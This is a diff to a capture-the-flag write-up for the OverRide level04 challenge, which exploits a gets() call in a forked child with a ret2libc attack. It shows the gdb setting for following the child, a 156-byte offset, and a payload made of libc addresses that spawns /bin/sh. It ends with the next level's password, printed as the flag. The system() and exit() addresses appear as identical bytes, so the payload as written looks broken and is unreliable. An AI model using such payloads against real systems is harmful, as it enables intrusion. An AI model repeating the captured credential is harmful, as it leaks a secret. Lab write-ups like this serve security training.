@@ -1,6 +1,6 @@
-
 # Ret2libc again x2
 
+## Program summary
 In this level we are provided with a program which takes a ShellCode as input.
 
 ```
@@ -8,8 +8,12 @@ level04@OverRide:~$ ./level04
 Give me some shellcode, k
 ```
 
-Basically this program launches a **`fork()`**, and in this process we have a **`gets()`**, since the stack will be popped in the classic way, we can use a ret2libc.
+Basically this program launches a **`fork()`**, and in this process we have a **`gets()`** for the input of ShellCode.
 
+## Vulnerability
+Since the stack will be popped in a classic way, we can use a ret2libc exploiting gets which has no forward and backward checks
+
+## Attack design
 In order to calculate the offset we will do as usual, inject the pattern and calculate it, however we will need to set a special option in order to access the child correctly: **`set follow-fork-mode child`**
 
 ```
@@ -26,7 +30,8 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 
 Here is the payload that we will inject :
-B * 156 -> *OFFSET*
+
+B * 156 -> ***OFFSET***
 \xd0\xae\xe6\xf7 -> **`system()`** addr
 \xd0\xae\xe6\xf7 -> **`exit()`** addr
 \xec\x97\xf8\xf7 -> **`"/bin/sh"`** string addr
@@ -42,4 +47,4 @@ cat /home/users/level05/.pass
 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
 ```
 
-> flag: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+> Flag : `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
